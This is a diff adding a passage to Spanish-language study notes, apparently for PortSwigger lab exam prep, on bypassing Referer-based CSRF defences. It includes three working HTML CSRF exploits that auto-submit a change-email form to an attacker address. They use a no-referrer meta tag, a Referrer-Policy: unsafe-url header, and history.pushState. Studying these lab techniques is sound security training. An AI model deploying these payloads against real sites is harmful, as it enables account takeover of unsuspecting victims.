@@ -108,11 +108,76 @@ La cookie moderna suele venir con `SameSite`. Cómo cae cada nivel:
 
 ## 🔗 Bypass de Referer
 
+El server quiere que el `Referer` (de dónde venís) sea del propio sitio. Cuando la víctima dispara tu exploit, el Referer sale con **tu** dominio (`exploit-server.net`) → la defensa te bloquea. Cómo la rompés depende de **qué tan débil valida**. Son **dos escenarios distintos** (dos labs), con objetivos opuestos sobre el Referer:
+
+> [!abstract] 🎨 Leyenda de colores (en los PoCs de abajo)
+> - <mark>🖊️ amarillo</mark> = **lo que VOS reemplazás** sí o sí antes de entregar (cambia según el lab: dominio del target, tu email). Si no lo tocás, **al horno**.
+> - <mark style="background:#90caf9;color:#111">🔑 azul</mark> = **la clave del bypass** (el mecanismo que hace que funcione). Es fijo, NO se cambia: es lo que tenés que entender/recordar.
+
 <table>
-<tr><th>Defensa Referer</th><th>Bypass</th></tr>
-<tr><td>Valida <b>solo si el Referer está presente</b></td><td>Suprimilo: <code>&lt;meta name="referrer" content="no-referrer"&gt;</code> en el exploit.</td></tr>
-<tr><td>Valida que el Referer <b>contenga</b> el dominio (substring)</td><td>Metelo en tu query string: <code>exploit.net/?<mark>target</mark>.web-security-academy.net</code> + <code>Referrer-Policy: unsafe-url</code> (o <code>history.pushState</code>).</td></tr>
+<tr><th>#</th><th>Defensa</th><th>Objetivo con el Referer</th><th>Idea del bypass</th></tr>
+<tr><td>A</td><td>Valida <b>solo si el Referer está presente</b> (si falta, deja pasar)</td><td><b>Que NO exista</b> (null / ausente)</td><td>Suprimir el Referer con <mark style="background:#90caf9;color:#111">no-referrer</mark>.</td></tr>
+<tr><td>B</td><td>Valida que el Referer <b>contenga</b> el dominio (match por <i>substring</i>)</td><td><b>Que exista con TU dominio</b> + el target embebido</td><td>Meter el dominio víctima en tu query string y forzar el Referer completo con <mark style="background:#90caf9;color:#111">unsafe-url</mark> / <mark style="background:#90caf9;color:#111">pushState</mark>.</td></tr>
 </table>
+
+> [!tip] 🔍 Cómo saber cuál es
+> Mandá la request legítima desde Burp y **borrale el header `Referer`**. Si **pasa** → es el caso **A** (validación solo-si-presente). Si **falla sin Referer pero pasa con uno válido** → es el caso **B** (tenés que falsificar el contenido).
+
+### A) Referer ausente — *validan solo si está presente*
+
+El server hace `if (referer) { chequeá que sea mío }`. Si no hay Referer, no hay nada que chequear → pasa. Suprimís el Referer para toda la página con la meta-tag `no-referrer`, y adentro va el **form auto-submit** de siempre.
+
+<pre><code>&lt;!-- pseudo: [meta no-referrer] + [form change-email] + [JS que lo autoenvía] --&gt;
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;!-- 🔑 clave: hace que NINGUNA request de esta página lleve Referer --&gt;
+    &lt;meta name="referrer" content="<mark style="background:#90caf9;color:#111">no-referrer</mark>"&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;form action="https://<mark>TARGET</mark>/my-account/change-email" method="POST"&gt;
+      &lt;input type="hidden" name="email" value="<mark>attacker@evil.com</mark>"&gt;
+    &lt;/form&gt;
+    &lt;script&gt;<mark style="background:#90caf9;color:#111">document.forms[0].submit();</mark>&lt;/script&gt;  &lt;!-- autoejecuta --&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+### B) Referer falsificado — *validan que contenga el dominio (substring)*
+
+El server hace `if (referer.includes("target.web-security-academy.net"))`. El match es por substring, no exacto → metés esa string **dentro de tu propia URL** (en la query). El Referer sale como `https://exploit-server.net/?target.web-security-academy.net` → contiene la string → pasa.
+
+> [!warning] ⚠️ El navegador recorta el Referer por defecto
+> Por privacidad, Chrome manda **solo el origin** (`https://exploit-server.net/`) y **borra la query string** → se pierde tu `?target...` y el bypass no anda. Tenés que forzar el Referer **completo**. Dos formas equivalentes:
+
+**Opción 1 — `Referrer-Policy: unsafe-url` (apuesta segura para el examen).** Es un **header** que configurás en el propio exploit server (campo *Head*, no en el HTML). Le dice al navegador "mandá el Referer completo, sin recortar".
+
+<pre><code>&lt;!-- En el exploit server, sección Head (headers de respuesta): --&gt;
+<mark style="background:#90caf9;color:#111">Referrer-Policy: unsafe-url</mark>
+
+&lt;!-- 🔑 clave: la URL del exploit lleva el target en la query → así aparece en el Referer --&gt;
+&lt;!-- exploit-server.net/exploit?<mark>TARGET</mark>  →  Referer = esa URL completa --&gt;
+&lt;html&gt;&lt;body&gt;
+  &lt;form action="https://<mark>TARGET</mark>/my-account/change-email" method="POST"&gt;
+    &lt;input type="hidden" name="email" value="<mark>attacker@evil.com</mark>"&gt;
+  &lt;/form&gt;
+  &lt;script&gt;<mark style="background:#90caf9;color:#111">document.forms[0].submit();</mark>&lt;/script&gt;
+&lt;/body&gt;&lt;/html&gt;</code></pre>
+
+**Opción 2 — `history.pushState` (alternativa JS).** En vez del header, **reescribís la URL de tu propia página** con JS *antes* de enviar el form, metiendo el dominio del target. Así el Referer que se manda ya lo lleva embebido. Útil si no querés/podés tocar los headers, o si querés controlar la string exacta desde el HTML.
+
+<pre><code>&lt;html&gt;&lt;body&gt;
+  &lt;form action="https://<mark>TARGET</mark>/my-account/change-email" method="POST"&gt;
+    &lt;input type="hidden" name="email" value="<mark>attacker@evil.com</mark>"&gt;
+  &lt;/form&gt;
+  &lt;script&gt;
+    // 🔑 clave: reescribe la URL actual → el Referer llevará el dominio del target embebido
+    // pushState(state, title, url)  →  url pasa a ser la "página actual"
+    <mark style="background:#90caf9;color:#111">history.pushState("", "", "/?</mark><mark>TARGET</mark><mark style="background:#90caf9;color:#111">");</mark>
+    <mark style="background:#90caf9;color:#111">document.forms[0].submit();</mark>  // recién ahora autoejecuta
+  &lt;/script&gt;
+&lt;/body&gt;&lt;/html&gt;</code></pre>
+
+> [!note] 📌 `unsafe-url` vs `pushState`
+> Con `Referrer-Policy: unsafe-url` el target va en la **query de la URL del exploit** (`?TARGET`) y el header hace que se mande entero. Con `history.pushState` el target lo inyectás **desde el JS** reescribiendo la URL. Para el examen priorizá **`unsafe-url`**: hoy `pushState` es menos fiable en Chrome. Tenelo como plan B.
 
 ## 🐍 PoCs (plantillas)
 
